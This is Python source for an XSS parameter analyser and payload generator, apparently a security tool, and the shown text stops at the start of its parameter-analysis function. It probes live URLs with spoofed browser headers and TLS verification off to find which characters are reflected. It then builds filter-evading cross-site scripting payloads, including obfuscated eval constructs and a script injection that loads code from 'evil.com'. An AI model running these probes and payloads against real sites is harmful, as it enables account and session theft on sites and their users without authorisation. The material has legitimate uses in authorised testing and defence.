#!/usr/bin/env python3

import os
import asyncio
import aiohttp
import string
import urllib.parse
import logging
import argparse
from tqdm.asyncio import tqdm_asyncio
from typing import Set, Optional, Tuple, List, Dict, Any
from dataclasses import dataclass
from pathlib import Path
from datetime import datetime
from colorama import init, Style, Fore
import subprocess
import re
import sys
import time
import warnings
import random

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

DEFAULT_MAX_CONNECTIONS = 40
DEFAULT_BATCH_SIZE = 10
VERSION = "0.0.1"
GITHUB_REPOSITORY: str = "Cybersecurity-Ethical-Hacker/xssdynagen"
GITHUB_URL: str = f"https://github.com/{GITHUB_REPOSITORY}"

class CacheManager:
    def __init__(self, ttl: int = 300):
        self.cache: Dict[str, Tuple[bool, float]] = {}
        self.ttl = ttl

    def get(self, key: str) -> Optional[bool]:
        if key in self.cache:
            result, timestamp = self.cache[key]
            if time.time() - timestamp <= self.ttl:
                return result
            del self.cache[key]
        return None

    def set(self, key: str, value: bool):
        self.cache[key] = (value, time.time())

    def clear_expired(self):
        current_time = time.time()
        self.cache = {
            k: v for k, v in self.cache.items()
            if current_time - v[1] <= self.ttl
        }

def filter_urls(urls: List[str]) -> Tuple[List[str], int]:
    filtered = []
    seen_patterns = set()
    seen_params = {}
    no_params_count = 0
    url_pattern = re.compile(r'^https?://')
    special_chars = re.compile(r'[^\w\-./&?=%]')

    for url in urls:
        url = url.strip()
        if not url or not url_pattern.match(url):
            continue
        if special_chars.findall(url):
            ratio = len(special_chars.findall(url)) / len(url)
            if ratio > 0.5:
                continue
        try:
            parsed = urllib.parse.urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if not parsed.query:
                no_params_count += 1
                continue
            params = frozenset(urllib.parse.parse_qs(parsed.query, keep_blank_values=True))
            pattern = (base_url, params)
            if pattern not in seen_patterns:
                seen_patterns.add(pattern)
                filtered.append(url)
        except Exception:
            continue
    return filtered, no_params_count

def setup_logging():
    log_dir = Path('logs')
    log_dir.mkdir(exist_ok=True)
    log_file = log_dir / 'xssdynagen_logs.txt'
    MAX_LOG_SIZE = 10 * 1024 * 1024
    try:
        if log_file.exists() and log_file.stat().st_size > MAX_LOG_SIZE:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = log_dir / f'xssdynagen_logs_{timestamp}.backup'
            log_file.rename(backup_file)
    except Exception as e:
        print(f"{Fore.RED}Error managing log file: {str(e)}{Style.RESET_ALL}")

    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.INFO)
    file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))

    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.CRITICAL)

    logging.basicConfig(
        level=logging.INFO,
        handlers=[file_handler, console_handler]
    )

    for logger_name in ['aiohttp', 'asyncio']:
        logger = logging.getLogger(logger_name)
        logger.setLevel(logging.WARNING)
        logger.handlers = []
        logger.addHandler(file_handler)
        logger.propagate = False

init(autoreset=True)
setup_logging()
warnings.filterwarnings('ignore', category=RuntimeWarning, module='asyncio')

def print_colored(text: str, color: str = Fore.WHITE, end: str = '\n') -> None:
    print(f"{color}{text}{Style.RESET_ALL}", end=end)

@dataclass
class ParamAnalysis:
    param: str
    url: str
    allowed_chars: Set[str]
    blocked_chars: Set[str]
    max_length: Optional[int]
    allows_spaces: bool
    allows_quotes: bool
    allows_angles: bool
    allows_parens: bool
    allows_scripts: bool
    allows_events: bool

class GitHandler:
    @staticmethod
    def check_git() -> Tuple[bool, str]:
        try:
            env = os.environ.copy()
            env["GIT_ASKPASS"] = "echo"
            env["GIT_TERMINAL_PROMPT"] = "0"
            with open(os.devnull, 'w') as devnull:
                result = subprocess.run(
                    ['git', '--version'],
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    check=True,
                    timeout=2,
                    env=env
                )
            return True, result.stdout.strip()
        except FileNotFoundError:
            return False, "Git is not installed"
        except subprocess.TimeoutExpired:
            return False, "Git command timed out"
        except subprocess.CalledProcessError:
            return False, "Git error"
        except Exception:
            return False, "Git check failed"

    @staticmethod
    def check_repo_status() -> Tuple[bool, str]:
        try:
            env = os.environ.copy()
            env["GIT_ASKPASS"] = "echo"
            env["GIT_TERMINAL_PROMPT"] = "0"
            with open(os.devnull, 'w') as devnull:
                subprocess.run(
                    ['git', 'rev-parse', '--git-dir'],
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    check=True,
                    timeout=2,
                    env=env
                )
            return True, "Repository OK"
        except:
            return False, "Repository not initialized"

class CharacterSetLoader:
    def __init__(self, file_path: Optional[str] = None):
        self.file_path = file_path
        self.char_groups = {
            'basic': string.ascii_letters + string.digits,
            'special': '<>()\'"`{}[];/@\\*&^%$#!',
            'spaces': ' \t\n\r',
            'encoded': '%20%0A%0D%3C%3E%22%27%3B%28%29',
            'unicode': '\u0022\u0027\u003C\u003E',
            'null_bytes': '\x00\x0D\x0A',
            'alternating_case': 'ScRiPt',
            'double_encoding': '%253C%253E%2522%2527',
            'html_entities': '&lt;&gt;&quot;&apos;',
            'comments': '<!---->/**/<!--',
            'protocol_handlers': 'javascript:data:vbscript:',
            'event_handlers': 'onmouseover=onload=onerror=onfocus='
        }

    def load_from_file(self) -> Dict[str, str]:
        if not self.file_path:
            return self.char_groups
        try:
            with open(self.file_path, 'r', encoding='utf-8') as f:
                custom_chars = {}
                current_group = None
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if line.startswith('[') and line.endswith(']'):
                        current_group = line[1:-1].strip().lower()
                        custom_chars[current_group] = ''
                        continue
                    if current_group:
                        seen = set(custom_chars[current_group])
                        for char in line:
                            if char not in seen:
                                custom_chars[current_group] += char
                                seen.add(char)
            return custom_chars if custom_chars else self.char_groups
        except FileNotFoundError:
            logging.warning(f"Character file not found: {self.file_path}")
            return self.char_groups
        except Exception as e:
            logging.error(f"Error loading character file: {str(e)}")
            return self.char_groups

    @staticmethod
    def validate_char_groups(char_groups: Dict[str, str]) -> bool:
        return all(
            isinstance(group, str) and isinstance(chars, str)
            for group, chars in char_groups.items()
        )

    def get_all_unique_chars(self) -> Set[str]:
        chars = self.load_from_file()
        return set(''.join(chars.values()))

class VersionManager:
    def __init__(self, file_path: str) -> None:
        self.file_path = Path(file_path)
        self.version_pattern = re.compile(r'VERSION\s*=\s*["\']([0-9]+\.[0-9]+\.[0-9]+)["\']')

    def get_current_version(self) -> str:
        try:
            content = self.file_path.read_text()
            match = self.version_pattern.search(content)
            if match:
                return match.group(1)
            raise ValueError("VERSION variable not found in file")
        except Exception as e:
            logging.error(f"Error reading version: {e}")
            return "0.0.1"

    def update_version(self, new_version: str) -> bool:
        try:
            content = self.file_path.read_text()
            updated_content = self.version_pattern.sub(f'VERSION = "{new_version}"', content)
            self.file_path.write_text(updated_content)
            return True
        except Exception as e:
            logging.error(f"Error updating version: {e}")
            return False

class Updater:
    def __init__(self) -> None:
        self.current_version: str = VERSION
        self.repo_path: Path = Path(__file__).parent
        self.is_git_repo: bool = self._check_git_repo()
        self.default_branch: Optional[str] = self._detect_default_branch()

    def _check_git_repo(self) -> bool:
        try:
            subprocess.run(
                ['git', 'rev-parse', '--git-dir'],
                cwd=self.repo_path,
                capture_output=True,
                check=True
            )
            return True
        except subprocess.CalledProcessError:
            return False
        except Exception:
            return False

    def _detect_default_branch(self) -> Optional[str]:
        if not self.is_git_repo:
            return None
        try:
            result = subprocess.run(
                ['git', 'remote', 'show', 'origin'],
                cwd=self.repo_path,
                capture_output=True,
                text=True,
                check=True
            )
            for line in result.stdout.split('\n'):
                if 'HEAD branch:' in line:
                    return line.split(':')[1].strip()
            for branch in ['main', 'master']:
                check_branch = subprocess.run(
                    ['git', 'rev-parse', '--verify', f'origin/{branch}'],
                    cwd=self.repo_path,
                    capture_output=True
                )
                if check_branch.returncode == 0:
                    return branch
        except:
            pass
        return 'main'

    def _run_git_command(self, command: List[str]) -> Optional[str]:
        if not self.is_git_repo:
            return None
        try:
            result = subprocess.run(
                command,
                cwd=self.repo_path,
                capture_output=True,
                text=True,
                check=True
            )
            return result.stdout.strip()
        except subprocess.CalledProcessError:
            return None

class AutoUpdater(Updater):
    def _check_git_repo(self) -> bool:
        try:
            env = os.environ.copy()
            env["GIT_ASKPASS"] = "echo"
            env["GIT_TERMINAL_PROMPT"] = "0"
            with open(os.devnull, 'w') as devnull:
                subprocess.run(
                    ['git', 'rev-parse', '--git-dir'],
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    check=True,
                    timeout=2,
                    env=env,
                    cwd=self.repo_path
                )
            return True
        except:
            return False

    def _detect_default_branch(self) -> Optional[str]:
        if not self.is_git_repo:
            return None
        try:
            env = os.environ.copy()
            env["GIT_ASKPASS"] = "echo"
            env["GIT_TERMINAL_PROMPT"] = "0"
            with open(os.devnull, 'w') as devnull:
                result = subprocess.run(
                    ['git', 'rev-parse', '--abbrev-ref', 'HEAD'],
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    check=True,
                    timeout=2,
                    env=env,
                    cwd=self.repo_path
                )
                return result.stdout.strip() or 'main'
        except:
            return 'main'

    def _run_git_command(self, command: List[str]) -> Optional[str]:
        if not self.is_git_repo:
            return None
        try:
            env = os.environ.copy()
            env["GIT_ASKPASS"] = "echo"
            env["GIT_TERMINAL_PROMPT"] = "0"
            with open(os.devnull, 'w') as devnull:
                result = subprocess.run(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    check=True,
                    timeout=2,
                    env=env,
                    cwd=self.repo_path
                )
            return result.stdout.strip()
        except:
            return None

    def _get_remote_changes(self) -> Tuple[bool, str]:
        if not self.default_branch:
            return False, "Check skipped"
        env = os.environ.copy()
        env["GIT_ASKPASS"] = "echo"
        env["GIT_TERMINAL_PROMPT"] = "0"
        try:
            with open(os.devnull, 'w') as devnull:
                fetch_result = subprocess.run(
                    ['git', 'fetch', '--tags', 'origin'],
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    timeout=2,
                    env=env,
                    cwd=self.repo_path
                )
            if fetch_result.returncode != 0:
                return False, "Check skipped"
        except:
            return False, "Check skipped"
        try:
            with open(os.devnull, 'w') as devnull:
                result = subprocess.run(
                    ['git', 'describe', '--tags', '--abbrev=0', f'origin/{self.default_branch}'],
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    timeout=2,
                    env=env,
                    cwd=self.repo_path
                )
            remote_tag = result.stdout.strip()
            if not remote_tag:
                return False, "Check skipped"
            remote_version = remote_tag.lstrip('v')
            current_version = self.current_version
            def version_tuple(v: str) -> Tuple[int, ...]:
                try:
                    return tuple(map(int, (v or '').split('.')))
                except:
                    return (0, 0, 0)
            remote_parts = version_tuple(remote_version)
            current_parts = version_tuple(current_version)
            if remote_parts > current_parts:
                return True, remote_version
            else:
                return False, current_version
        except:
            return False, "Check skipped"

    def _perform_update(self) -> Dict[str, Any]:
        if not self.default_branch:
            return {
                'status': 'error',
                'message': 'No default branch detected'
            }
        if not self._run_git_command(['git', 'reset', '--hard', f'origin/{self.default_branch}']):
            return {
                'status': 'error',
                'message': 'Update failed'
            }
        pull_output = self._run_git_command(['git', 'pull', '--force', 'origin', self.default_branch])
        if not pull_output:
            return {
                'status': 'error',
                'message': 'Pull failed'
            }
        current_tag = self._run_git_command(['git', 'describe', '--tags', '--abbrev=0']) or VERSION
        return {
            'status': 'success',
            'message': 'Update successful',
            'version': current_tag.lstrip('v'),
            'changes': pull_output,
            'updated': True
        }

    def _compare_versions(self, v1: str, v2: str) -> bool:
        try:
            v1_parts = list(map(int, v1.split('.')))
            v2_parts = list(map(int, v2.split('.')))
            while len(v1_parts) < len(v2_parts):
                v1_parts.append(0)
            while len(v2_parts) < len(v1_parts):
                v2_parts.append(0)
            return v1_parts > v2_parts
        except:
            return False

    def check_and_update(self) -> Dict[str, Any]:
        if not self.is_git_repo:
            return {
                'status': 'error',
                'message': 'Not a git repository'
            }
        has_changes, info = self._get_remote_changes()
        if info == "Check skipped":
            return {
                'status': 'success',
                'message': 'Check skipped',
                'version': self.current_version,
                'updated': False
            }
        elif not has_changes:
            return {
                'status': 'success',
                'message': 'Already at latest version',
                'version': self.current_version,
                'updated': False
            }
        update_result = self._perform_update()
        return update_result

class XSSParamAnalyzer:
    @staticmethod
    def get_default_headers() -> Dict[str, str]:
        chrome_versions = [
            "122.0.6261.112",
            "121.0.6167.184",
            "120.0.6099.130"
        ]
        languages = [
            "en-US,en;q=0.9",
            "en-GB,en;q=0.9",
            "en-US,en;q=0.9,es;q=0.8",
            "en-US,en;q=0.9,fr;q=0.8"
        ]
        chrome_version = random.choice(chrome_versions)
        language = random.choice(languages)
        return {
            'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': language,
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Ch-Ua': f'"Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}", "Not(A:Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
            'Sec-Ch-Ua-Full-Version-List': f'"Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}", "Not(A:Brand";v="24.0.0.0"',
            'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'same-site']),
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Upgrade-Insecure-Requests': '1',
            'Connection': 'keep-alive',
            'Priority': random.choice(['u=0, i', 'u=1, i']),
            'Viewport-Width': random.choice(['1920', '1600', '1440']),
            'Device-Memory': random.choice(['8', '4', '6']),
            'Permissions-Policy': 'interest-cohort=()',
            'DNT': '1'
        }

    def __init__(self, max_connections: int = DEFAULT_MAX_CONNECTIONS, batch_size: int = DEFAULT_BATCH_SIZE,
                 timeout: int = 5, output_file: str = 'xss_payloads_gen', headers: Dict[str, str] = None,
                 char_file: Optional[str] = None):
        self.max_connections = max_connections
        self.batch_size = batch_size
        self.timeout = timeout
        self.output_file = output_file
        self.custom_headers = headers or {}
        self.session: Optional[aiohttp.ClientSession] = None
        self.char_loader = CharacterSetLoader(char_file)
        self.char_groups = self.char_loader.load_from_file()
        self.payloads_dir = Path('payloads')
        self.payloads_dir.mkdir(exist_ok=True)
        self.char_cache: Dict[str, bool] = {}
        repo_status, repo_message = GitHandler.check_repo_status()
        if not repo_status:
            self.version_info = {
                'current': VERSION,
                'update_available': 'Unknown (No Repository)'
            }
        else:
            self.version_info = self._check_version()

    def _get_current_version(self) -> str:
        try:
            env = os.environ.copy()
            env["GIT_ASKPASS"] = "echo"
            env["GIT_TERMINAL_PROMPT"] = "0"
            with open(os.devnull, 'w') as devnull:
                result = subprocess.run(
                    ['git', 'describe', '--tags', '--abbrev=0'],
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    check=True,
                    timeout=2,
                    env=env,
                    cwd=Path(__file__).parent
                )
            version = result.stdout.strip()
            if not version:
                return "Unknown"
            return version.lstrip('v')
        except:
            return "Unknown"

    def _get_remote_version(self) -> Optional[str]:
        try:
            env = os.environ.copy()
            env["GIT_ASKPASS"] = "echo"
            env["GIT_TERMINAL_PROMPT"] = "0"
            with open(os.devnull, 'w') as devnull:
                fetch_result = subprocess.run(
                    ['git', 'fetch', '--tags', 'origin'],
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    timeout=2,
                    env=env,
                    cwd=Path(__file__).parent
                )
                if fetch_result.returncode != 0:
                    return None
                result = subprocess.run(
                    ['git', 'describe', '--tags', '--abbrev=0', 'origin/main'],
                    stdout=subprocess.PIPE,
                    stderr=devnull,
                    text=True,
                    check=True,
                    timeout=2,
                    env=env,
                    cwd=Path(__file__).parent
                )
            version = result.stdout.strip()
            return version.lstrip('v') if version else None
        except:
            return None

    def _check_version(self) -> Dict[str, str]:
        try:
            current_version = self._get_current_version()
            if current_version == "Unknown":
                return {
                    'current': current_version,
                    'update_available': 'Unknown'
                }
            remote_version = self._get_remote_version()
            if remote_version is None:
                return {
                    'current': current_version,
                    'update_available': 'Check skipped'
                }
            def version_tuple(v: str) -> Tuple[int, ...]:
                try:
                    return tuple(map(int, (v or '').split('.')))
                except:
                    return (0, 0, 0)
            remote_parts = version_tuple(remote_version)
            current_parts = version_tuple(current_version)
            if remote_parts > current_parts:
                return {
                    'current': current_version,
                    'update_available': 'Yes'
                }
            else:
                return {
                    'current': current_version,
                    'update_available': 'No'
                }
        except:
            return {
                'current': self._get_current_version(),
                'update_available': 'Check skipped'
            }

    def banner(self) -> None:
        banner_width = 86
        def center_text(text: str, width: int = banner_width) -> str:
            return text.center(width)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_path = self.payloads_dir / f"{self.output_file}_{timestamp}.txt"
        logo = f"""
{Fore.RED}██╗  ██╗██╗  ██╗███████╗██████╗ ██╗   ██╗███╗   ██╗ █████╗  ██████╗ ███████╗███╗   ██╗
╚██╗██╔╝╚██╗██╔╝██╔════╝██╔══██╗╚██╗ ██╔╝████╗  ██║██╔══██╗██╔════╝ ██╔════╝████╗  ██║
 ╚███╔╝  ╚███╔╝ ███████╗██║  ██║ ╚████╔╝ ██╔██╗ ██║███████║██║  ███╗█████╗  ██╔██╗ ██║
 ██╔██╗  ██╔██╗ ╚════██║██║  ██║  ╚██╔╝  ██║╚██╗██║██╔══██║██║   ██║██╔══╝  ██║╚██╗██║
██╔╝ ██╗██╔╝ ██╗███████║██████╔╝   ██║   ██║ ╚████║██║  ██║╚██████╔╝███████╗██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝{Style.RESET_ALL}"""
        print(logo)
        print(center_text(f"{Fore.RED}By Dimitris Chatzidimitris{Style.RESET_ALL}"))
        print(center_text(f"{Fore.RED}Email: dimitris.chatzidimitris@gmail.com{Style.RESET_ALL}"))
        print(center_text(f"{Fore.RED}Parameter Analysis / Server Characters Allowance / Dynamic Payloads Generation{Style.RESET_ALL}"))
        print()
        print_colored("🔧 Configuration:", Fore.CYAN)
        print(f"- Version: {Fore.YELLOW}{self.version_info['current']}{Style.RESET_ALL}")
        print(f"- Update Available: {Fore.YELLOW}{self.version_info['update_available']}{Style.RESET_ALL}")
        print(f"- Global Max Connections: {Fore.CYAN}{self.max_connections}{Style.RESET_ALL}")
        print(f"- Timeout: {Fore.CYAN}{self.timeout}s{Style.RESET_ALL}")
        print(f"- Output File: {Fore.CYAN}{str(output_path.absolute())}{Style.RESET_ALL}")
        print()

    def extract_parameters(self, url: str) -> Dict[str, Optional[str]]:
        try:
            parsed = urllib.parse.urlparse(url)
            params = {}
            if not parsed.query:
                return {}
            param_pairs = re.split('[&;]', parsed.query)
            for pair in param_pairs:
                if not pair:
                    continue
                if '=' not in pair:
                    params[urllib.parse.unquote(pair)] = None
                    continue
                param_name, value = pair.split('=', 1)
                param_name = urllib.parse.unquote(param_name)
                value = urllib.parse.unquote(value) if value else None
                params[param_name] = value
            return params
        except Exception as e:
            logging.error(f"Error parsing URL parameters: {str(e)}")
            return {}

    def validate_url_parameters(self, url: str) -> bool:
        try:
            params = self.extract_parameters(url)
            return len(params) > 0
        except Exception as e:
            logging.error(f"Error validating URL parameters: {str(e)}")
            return False

    def validate_url_list(self, urls: List[str]) -> Tuple[bool, List[str]]:
        valid_urls = [url.strip() for url in urls if self.validate_url_parameters(url.strip())]
        return bool(valid_urls), valid_urls

    async def init_session(self):
        connector = aiohttp.TCPConnector(
            limit=self.max_connections,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            force_close=True,
            ssl=False
        )
        headers = self.get_default_headers()
        headers.update(self.custom_headers)
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            connector=connector,
            headers=headers
        )

    async def test_single_char(self, url: str, param: str, char: str, session: aiohttp.ClientSession) -> bool:
        try:
            parsed = urllib.parse.urlparse(url)
            test_params = {param: char * 2}
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(test_params))
            )
            async with session.get(test_url, timeout=2) as response:
                if response.status != 200:
                    return False
                content = await response.text()
                return char * 2 in content
        except Exception:
            return False

    async def quick_test_scripts(self, url: str, param: str) -> bool:
        test_payloads = [
            "<script>",
            "<SCRIPT>",
            "<ScRiPt>",
            "<%73cript>",
            "<scr<script>ipt>",
            "<svg/script>",
            "<<script>>",
            "</script>",
            "<script/>",
            "\\x3Cscript\\x3E",
            "&lt;script&gt;",
            "&#x3C;script&#x3E;",
            "<img src=x onerror=",
            "<svg onload=",
            "<iframe onload=",
            "<video onloadstart="
        ]
        for payload in test_payloads:
            allowed = await self.test_chars_batch(url, param, payload)
            if allowed:
                return True
        return False

    async def quick_test_events(self, url: str, param: str) -> bool:
        test_payloads = [
            "onmouseover=",
            "onclick=",
            "onerror=",
            "onload=",
            "onmouseenter=",
            "onmouseleave=",
            "onfocus=",
            "onblur=",
            "onkeyup=",
            "onkeydown=",
            "ondblclick=",
            "oncontextmenu=",
            "ondrag=",
            "ondragend=",
            "onkeypress=",
            "onchange=",
            "onsubmit="
        ]
        for payload in test_payloads:
            allowed = await self.test_chars_batch(url, param, payload)
            if allowed:
                return True
        return False

    async def quick_test_length(self, url: str, param: str) -> Optional[int]:
        left, right = 10, 5000
        while left <= right:
            mid = (left + right) // 2
            test_str = 'A' * mid
            allowed = await self.test_chars_batch(url, param, test_str)
            if allowed:
                left = mid + 1
            else:
                right = mid - 1
        return right if right > 0 else None

    def get_predefined_payloads(self, analysis: ParamAnalysis) -> Set[str]:
        payloads = set()
        if (analysis.allows_angles and analysis.allows_scripts and
            '=' in analysis.allowed_chars and
            '/' in analysis.allowed_chars):
            payloads.update([
                "<script>alert(1)</script>",
                "<script>prompt(1)</script>",
                "<script>confirm(1)</script>",
                "<svg onload=alert(1)>",
                "<svg/onload=prompt()>",
                "<svg/onload=alert&sol;**&sol;(3)>",
                "<svg/onload=alert/*1337*/(1)>",
                "<svg/onload=prompt()>",
                "<svg/onload=alert//&NewLine;(2)>",
                "<svg/onload=alert/&#42;&#42;/(4)>",
                "<svg/onload=alert&#x2F;**&#47;(5)>",
                "<body onload=alert(1)>",
                "<iframe onload=alert(1)>"
            ])
            if analysis.allows_quotes:
                payloads.update([
                    "<script type=\"text/javascript\">javascript:alert(1);</script>",
                    "\"><script>prompt()</script>",
                    "\"><img src=x onerror=prompt()>",
                    "\"><iMg SrC=x onError=prompt()>",
                    "<img src=\"x\" onerror=\"alert(1)\">",
                    "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>",
                    "'\"--></style></script><svg onload=alert(1)//",
                    "\"'--></style></script><img src=x onerror=alert(1)>",
                    "javascript:\"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=alert(1)//>"
                ])
        if not analysis.allows_angles:
            payloads.update([
                "javascript:alert(1)",
                "&lt;script&gt;alert(1)&lt;/script&gt;",
                "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"
            ])
        if analysis.allows_angles and analysis.allows_quotes:
            payloads.update([
                "<style>@import 'javascript:alert(1)';</style>",
                "<link rel=stylesheet href=javascript:alert(1)>",
                "<div style='background-image: url(javascript:alert(1))'>",
                "<style>*[{}*{background:url(javascript:alert(1))}]{color: red};</style>",
                "<div style=\"background:url(javascript:alert(1))\">",
                "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationend=\"alert(1)\"></div>"
            ])
        return payloads

    def generate_dynamic_payloads(self, analysis: ParamAnalysis) -> Set[str]:
        dynamic_payloads = set()
        if analysis.allows_angles and '<' in analysis.allowed_chars and '>' in analysis.allowed_chars:
            base_tags = ['script', 'img', 'svg', 'iframe', 'video', 'audio', 'body']
            event_handlers = ['onload', 'onerror', 'onmouseover', 'onclick', 'onmouseenter']
            js_functions = ['alert', 'prompt', 'confirm', 'eval', 'atob']
            tag_mutations = {
                'script': ['ScRiPt', 'scr\x00ipt', '〈script〉'],
                'img': ['ImG', 'i\x00mg'],
                'svg': ['SvG', 's\x00vg']
            }
            for tag in base_tags:
                if all(c in analysis.allowed_chars for c in tag):
                    mutations = tag_mutations.get(tag, [tag])
                    for mutated_tag in mutations:
                        if all(c in analysis.allowed_chars for c in mutated_tag):
                            if '*' in analysis.allowed_chars and '/' in analysis.allowed_chars:
                                for func in js_functions:
                                    if all(c in analysis.allowed_chars for c in func):
                                        dynamic_payloads.update([
                                            f"<{mutated_tag}>/**/{func}(1)/**/",
                                            f"<{mutated_tag}>/*-->{func}(1)/**/",
                                            f"<{mutated_tag}>//{func}(1)"
                                        ])
                            if '\x00' in analysis.allowed_chars:
                                for func in js_functions:
                                    if all(c in analysis.allowed_chars for c in func):
                                        dynamic_payloads.update([
                                            f"<{tag}\x00>{func}(1)",
                                            f"<{tag}>\x00{func}(1)"
                                        ])
            if '=' in analysis.allowed_chars:
                event_mutations = {
                    'onload': ['OnLoad', 'ONLOAD', 'on\x00load'],
                    'onerror': ['OnError', 'ONERROR', 'on\x00error']
                }
                for tag in ['img', 'svg', 'iframe']:
                    if all(c in analysis.allowed_chars for c in tag):
                        for event in event_handlers:
                            event_vars = event_mutations.get(event, [event])
                            for ev in event_vars:
                                if all(c in analysis.allowed_chars for c in ev):
                                    if analysis.allows_quotes:
                                        dynamic_payloads.add(f"<{tag} data-{ev}=\"alert(1)\">")
                                    if ':' in analysis.allowed_chars:
                                        dynamic_payloads.add(f"<{tag} {ev}=javascript:alert(1)>")
                                    if '&' in analysis.allowed_chars and ';' in analysis.allowed_chars:
                                        dynamic_payloads.add(f"<{tag} {ev}=&quot;alert(1)&quot;>")
        if analysis.allows_angles and analysis.allows_scripts:
            dom_evasions = [
                "<script>eval(atob(`YWxlcnQoMSk=`))</script>",
                "<script>[].filter.constructor('alert(1)')()</script>",
                "<script>setTimeout`alert\\x28document.domain\\x29`</script>",
                "<script>Object.assign(window,{alert:eval})('1')</script>",
                "<script>new Function\\`alert\\`1\\`\\`</script>",
                "<script>with(document)body.appendChild(createElement`script`).src='//evil.com'</script>",
                "<script>eval.call`${'alert(1)'}`</script>"
            ]
            for evasion in dom_evasions:
                if all(c in analysis.allowed_chars for c in evasion):
                    dynamic_payloads.add(evasion)
        if all(c in analysis.allowed_chars for c in 'javascript:'):
            proto_evasions = [
                "javascript:void(`alert(1)`)",
                "javascript:(alert)(1)",
                "javascript:new Function\\`alert\\`1\\`\\`",
                "javascript:this",
                "javascript:[][filter][constructor]('alert(1)')()",
                "javascript:alert?.()?.['']",
                "javascript:new%20Function\\`alert\\`1\\`\\`",
                "javascript:(?=alert)w=1,alert(w)"
            ]
            for evasion in proto_evasions:
                if all(c in analysis.allowed_chars for c in evasion):
                    dynamic_payloads.add(evasion)
        return dynamic_payloads

    def generate_payloads(self, analysis: ParamAnalysis) -> List[str]:
        all_payloads = set()
        predefined_payloads = self.get_predefined_payloads(analysis)
        all_payloads.update(predefined_payloads)
        dynamic_payloads = self.generate_dynamic_payloads(analysis)
        all_payloads.update(dynamic_payloads)
        if analysis.max_length:
            all_payloads = {p for p in all_payloads if len(p) <= analysis.max_length}
        final_payloads = set()
        for payload in all_payloads:
            if not payload.strip():
                continue
            if not any(char in analysis.blocked_chars for char in payload):
                final_payloads.add(payload)
        return list(final_payloads)

    async def retry_request(self, url: str, max_retries: int = 3, delay: float = 1) -> str:
        for attempt in range(max_retries):
            try:
                async with self.session.get(url) as response:
                    return await response.text()
            except Exception:
                if attempt == max_retries - 1:
                    raise
                await asyncio.sleep(delay * (attempt + 1))
        return ""

    async def test_chars_batch(self, url: str, param: str, chars: str) -> bool:
        cache = CacheManager()
        async def test_single(char: str, session: aiohttp.ClientSession) -> Tuple[str, bool]:
            cache_key = f"{url}:{param}:{char}"
            cached_result = cache.get(cache_key)
            if cached_result is not None:
                return char, cached_result
            try:
                parsed = urllib.parse.urlparse(url)
                test_params = {param: char * 2}
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(test_params))
                )
                async with session.get(test_url, timeout=2) as response:
                    if response.status != 200:
                        cache.set(cache_key, False)
                        return char, False
                    content = await response.text()
                    result = char * 2 in content
                    cache.set(cache_key, result)
                    return char, result
            except (asyncio.TimeoutError, Exception):
                cache.set(cache_key, False)
                return char, False
        try:
            batch_size = 20
            char_batches = [chars[i:i + batch_size] for i in range(0, len(chars), batch_size)]
            async with aiohttp.ClientSession() as session:
                for batch in char_batches:
                    tasks = [test_single(char, session) for char in batch]
                    results = await asyncio.gather(*tasks)
                    if any(is_allowed for _, is_allowed in results):
                        return True
            return False
        except Exception as e:
            logging.error(f"Error in test_chars_batch: {str(e)}")
            return False

    async def analyze_parameter(self, url: str, param: str) -> ParamAnalysis:
        print(f"\r{' ' * 100}\r{Fore.YELLOW}🔍 Testing the reflective behavior for parameter: '{param}'{Style.RESET_ALL}", end='', flush=True)
        
